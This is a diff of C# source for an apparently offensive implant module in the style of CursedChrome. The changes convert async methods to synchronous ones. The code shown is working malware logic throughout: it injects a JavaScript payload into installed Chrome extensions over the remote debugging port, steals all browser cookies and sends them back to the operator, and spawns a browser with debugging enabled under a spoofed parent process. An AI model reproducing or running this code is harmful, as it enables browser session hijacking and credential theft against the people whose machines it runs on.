@@ -83,16 +83,16 @@ namespace Agent
             switch (inputParts[0])
             {
                 case "cursed":
-                    await this.Cursed(this.config.payload, message.task_id);
+                    this.Cursed(this.config.payload, message.task_id);
                     break;
                 case "cookies":
-                    await this.TryGetCookies(message.task_id);
+                    this.TryGetCookies(message.task_id);
                     break;
                 case "get":
                     if (inputParts.Length < 2)
-                        await this.GetValue("", message.task_id);
+                        this.GetValue("", message.task_id);
                     else
-                        await this.GetValue(inputParts[1], message.task_id);
+                        this.GetValue(inputParts[1], message.task_id);
                     break;
                 case "set":
                     string value = String.Empty;
@@ -102,31 +102,31 @@ namespace Agent
                         value = inputParts[2].TrimStart('"').TrimEnd('"');
 
                     //string args = string.Join(" ", inputParts, 2, inputParts.Length -1);
-                    await this.SetConfig(inputParts[1], value, message.task_id);
+                    this.SetConfig(inputParts[1], value, message.task_id);
                     break;
                 case "inject-js":
                     if (inputParts.Count() < 3)
                     {
-                        await ReturnOutput("Please specify both an ID and a payload", message.task_id);
+                        ReturnOutput("Please specify both an ID and a payload", message.task_id);
                         break;
                     }
 
-                    var res = await InjectJs(inputParts[1], inputParts[2], config, message.task_id);
+                    var res = InjectJs(inputParts[1], inputParts[2], config, message.task_id);
                     break;
                 case "spawn":
 
                     if (inputParts.Length < 2)
                     {
-                        await ReturnOutput("Please specify a browser.", message.task_id);
+                        ReturnOutput("Please specify a browser.", message.task_id);
                         break;
                     }
 
-                    if (!await Spawn(inputParts[1], user_input, message.task_id))
+                    if (!Spawn(inputParts[1], user_input, message.task_id))
                     {
-                        await ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
+                        ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                         break;
                     }
-                    await ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
+                    ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                     break;
                 case "exit":
                     this.config = new CursedConfig();
@@ -147,26 +147,26 @@ namespace Agent
                     break;
             }
         }
-        private async Task Cursed(string payload, string task_id)
+        private void Cursed(string payload, string task_id)
         {
             //Parse for chosen browser
-            await ReturnOutput("[+] Getting extensions", task_id);
-            var extensions = await GetExtensions(this.config, task_id);
+            ReturnOutput("[+] Getting extensions", task_id);
+            var extensions = GetExtensions(this.config, task_id);
 
             if (extensions.Count <= 0)
             {
                 //No extensions installed
-                await ReturnOutput("[!] No extensions found", task_id);
+                ReturnOutput("[!] No extensions found", task_id);
                 return;
             }
 
-            await ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);
+            ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);
 
             List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();
 
             foreach (var extension in extensions)
             {
-                var manifest = await GetManifestFromExtension(extension, task_id);
+                var manifest = GetManifestFromExtension(extension, task_id);
                 if (manifest is null)
                 {
                     continue;
@@ -187,52 +187,52 @@ namespace Agent
 
             if (extensionCandidates.Count <= 0)
             {
-                await ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
+                ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
                 return;
             }
 
-            await ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);
+            ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);
 
             if (string.IsNullOrEmpty(payload))
             {
                 if (string.IsNullOrEmpty(this.config.target))
                 {
-                    await ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
+                    ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
                     return;
                 }
                 payload = this.config.GetDefaultPayload();
             }
 
-            await ReturnOutput("[+] Injecting our payload", task_id);
+            ReturnOutput("[+] Injecting our payload", task_id);
             foreach (var extension in extensionCandidates)
             {
                 if (TryInjectJs(extension, payload, task_id, out var response))
                 {
-                    await ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
+                    ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
                     return;
                 }
-                await ReturnOutput("[!] Failed to inject payload." + Environment.NewLine + $"Response: {response}", task_id);
+                ReturnOutput("[!] Failed to inject payload." + Environment.NewLine + $"Response: {response}", task_id);
             }
         }
-        private async Task<bool> TryGetCookies(string task_id)
+        private bool TryGetCookies(string task_id)
         {
-            List<ChromeJsonObject> extensions = await GetExtensions(this.config, task_id);
+            List<ChromeJsonObject> extensions = GetExtensions(this.config, task_id);
 
             if (extensions.Count == 0)
             {
                 return false;
             }
 
-            string response = await InjectGetAllCookies(extensions.First(), task_id);
+            string response = InjectGetAllCookies(extensions.First(), task_id);
 
             if (this.config.debug)
             {
-                await ReturnOutput(response, task_id);
+                ReturnOutput(response, task_id);
             }
 
             if (string.IsNullOrEmpty(response))
             {
-                await ReturnOutput("[!] Failed to inject JS for cookies request", task_id);
+                ReturnOutput("[!] Failed to inject JS for cookies request", task_id);
                 return false;
             }
 
@@ -242,19 +242,19 @@ namespace Agent
             if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
             {
                 //Strip outer edge, leaving only the good inside
-                await ReturnOutput("[+] Returning parsed cookies file", task_id);
+                ReturnOutput("[+] Returning parsed cookies file", task_id);
                 this.cookiesOut.Add(task_id, resultElement.GetRawText());
-                await StartSendFile(task_id);
+                StartSendFile(task_id);
                 return true;
             }
 
             //Something fucked up, so just return the raw response
-            await ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
+            ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
             this.cookiesOut.Add(task_id, response);
-            await StartSendFile(task_id);
+            StartSendFile(task_id);
             return false;
         }
-        private async Task<bool> Spawn(string choice, string full_cmdline, string task_id)
+        private bool Spawn(string choice, string full_cmdline, string task_id)
         {
             string commandline = string.Empty;
 
@@ -289,7 +289,7 @@ namespace Agent
 
                 if (string.IsNullOrEmpty(location))
                 {
-                    await ReturnOutput("[!] Failed to find executable locatino.", task_id);
+                    ReturnOutput("[!] Failed to find executable locatino.", task_id);
                     return false;
                 }
                 commandline = $"{location} --remote-debugging-port={this.config.debug_port}";
@@ -305,9 +305,9 @@ namespace Agent
                 parent = this.config.parent
             };
 
-            return await spawner.Spawn(opts);
+            return spawner.Spawn(opts).Result;
         }
-        private async Task SetConfig(string choice, string value, string task_id)
+        private void SetConfig(string choice, string value, string task_id)
         {
             Type type = config.GetType();
             PropertyInfo property = type.GetProperty(choice);
@@ -321,20 +321,20 @@ namespace Agent
                 else
                     property.SetValue(config, value);
 
-                await ReturnOutput("Set " + choice + " to " + value, task_id);
+                ReturnOutput("Set " + choice + " to " + value, task_id);
             }
             else
             {
-                await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
             }
         }
-        private async Task GetValue(string choice, string task_id)
+        private void GetValue(string choice, string task_id)
         {
             switch (choice.ToLower())
             {
                 case "extensions":
-                    var extensions = await GetExtensions(this.config, task_id);
-                    await ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
+                    var extensions = GetExtensions(this.config, task_id);
+                    ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
                     break;
                 case "":
                 case null:
@@ -342,11 +342,11 @@ namespace Agent
                     {
                         if (prop.GetValue(config) is null)
                         {
-                            await ReturnOutput($"{prop.Name}: <empty>", "");
+                            ReturnOutput($"{prop.Name}: <empty>", "");
                         }
                         else
                         {
-                            await ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
+                            ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
                         }
 
                     }
@@ -358,7 +358,7 @@ namespace Agent
                         var property = type.GetProperty(choice);
                         if(property is null)
                         {
-                            await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                            ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                             return;
                         }
 
@@ -366,23 +366,23 @@ namespace Agent
 
                         if(propVal is null)
                         {
-                            await ReturnOutput($"{choice}: <empty>", task_id);
+                            ReturnOutput($"{choice}: <empty>", task_id);
                             return;
                         }
 
-                        await ReturnOutput($"{choice}: {propVal}", task_id);
+                        ReturnOutput($"{choice}: {propVal}", task_id);
                     }
                     catch
                     {
-                        await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                        ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                     }
                 break;
 
             }
         } 
-        private async Task StartSendFile(string task_id)
+        private void StartSendFile(string task_id)
         {
-            await messageManager.AddResponse(new DownloadResponse
+            messageManager.AddResponse(new DownloadResponse
             {
                 download = new DownloadResponseData()
                 {
@@ -395,9 +395,9 @@ namespace Agent
                 task_id = task_id,
             }.ToJson());
         }
-        private async Task ReturnOutput(string message, string task_id)
+        private void ReturnOutput(string message, string task_id)
         {
-            await this.messageManager.AddResponse(new InteractMessage()
+            this.messageManager.AddResponse(new InteractMessage()
             {
                 task_id = task_id,
                 data = Misc.Base64Encode(message + Environment.NewLine),
